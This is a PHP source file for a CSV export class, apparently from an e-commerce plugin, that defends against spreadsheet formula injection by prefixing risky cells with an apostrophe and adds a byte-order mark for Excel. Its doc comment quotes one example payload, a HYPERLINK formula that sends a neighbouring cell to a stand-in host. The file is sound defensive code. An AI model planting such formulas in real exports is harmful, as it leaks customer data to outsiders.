<?php
/**
 * CSV that is safe to open in a spreadsheet.
 *
 * @package   SugarCommerce\Format
 * @copyright Copyright (c) 2026, ArrayPress Limited
 * @license   GPL-2.0-or-later
 * @since     1.1.0
 */

declare( strict_types=1 );

namespace SugarCommerce\Format;

/**
 * Class Csv
 *
 * An export is opened in Excel, Numbers or Sheets, not parsed by a program —
 * and all three run a cell that starts with `=` as a formula. A customer
 * whose name is `=HYPERLINK("https://evil.test?"&A1,"Click")` becomes a link
 * that posts the row beside it somewhere else when the seller clicks it.
 * OWASP calls it CSV injection; the defence is a leading apostrophe on any
 * cell that starts with a character a spreadsheet treats as the start of a
 * formula, which every one of them displays as nothing.
 *
 * Also written with a byte-order mark, because Excel otherwise reads UTF-8
 * as Windows-1252 and `Café` arrives as `CafÃ©`.
 *
 * @since 1.1.0
 */
final class Csv {

	/**
	 * Characters that make a spreadsheet read a cell as a formula.
	 *
	 * Tab and carriage return too: some importers strip leading whitespace
	 * and then see the `=` behind it.
	 */
	private const TRIGGERS = array( '=', '+', '-', '@', "\t", "\r" );

	/**
	 * A whole file: header row, then the rows.
	 *
	 * @since 1.1.0
	 *
	 * @param string[]                     $headers Column names.
	 * @param iterable<array<int, scalar|null>> $rows    Rows, each in header order.
	 * @param bool                         $bom     Start with a UTF-8 byte-order
	 *                                              mark, for Excel.
	 *
	 * @return string
	 */
	public static function build( array $headers, iterable $rows, bool $bom = true ): string {
		$out = fopen( 'php://temp', 'r+' );

		fputcsv( $out, array_map( self::cell( ... ), $headers ), escape: '' );

		foreach ( $rows as $row ) {
			fputcsv( $out, array_map( self::cell( ... ), array_values( $row ) ), escape: '' );
		}

		rewind( $out );

		$csv = (string) stream_get_contents( $out );

		fclose( $out );

		return ( $bom ? "\xEF\xBB\xBF" : '' ) . $csv;
	}

	/**
	 * One value, made safe to open.
	 *
	 * Numbers are left alone — a negative amount is a number, not a formula,
	 * and prefixing it would make it text that no longer sums.
	 *
	 * @since 1.1.0
	 *
	 * @param scalar|null $value Value.
	 *
	 * @return string
	 */
	public static function cell( mixed $value ): string {
		if ( is_int( $value ) || is_float( $value ) ) {
			return (string) $value;
		}

		if ( is_bool( $value ) ) {
			return $value ? 'yes' : 'no';
		}

		$text = (string) $value;

		return '' !== $text && in_array( $text[0], self::TRIGGERS, true ) ? "'" . $text : $text;
	}
}
